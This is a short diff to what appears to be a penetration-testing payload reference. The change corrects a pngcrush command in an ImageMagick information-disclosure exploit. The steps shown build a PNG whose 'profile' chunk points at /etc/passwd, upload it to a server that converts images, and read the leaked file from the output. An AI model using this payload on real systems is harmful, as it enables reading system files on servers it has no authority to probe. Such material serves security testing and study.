@@ -40,7 +40,7 @@ Information Disclosure: embedded the content of an arbitrary remote file
 * Generate the payload
     ```ps1
     apt-get install pngcrush imagemagick exiftool exiv2 -y
-    pngcrush -text a "profile" "/etc/passwd" exploit.png
+    pngcrush -text a "profile" "/etc/passwd" your-image.png exploit.png
     ```
 * Trigger the exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`
 * Download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
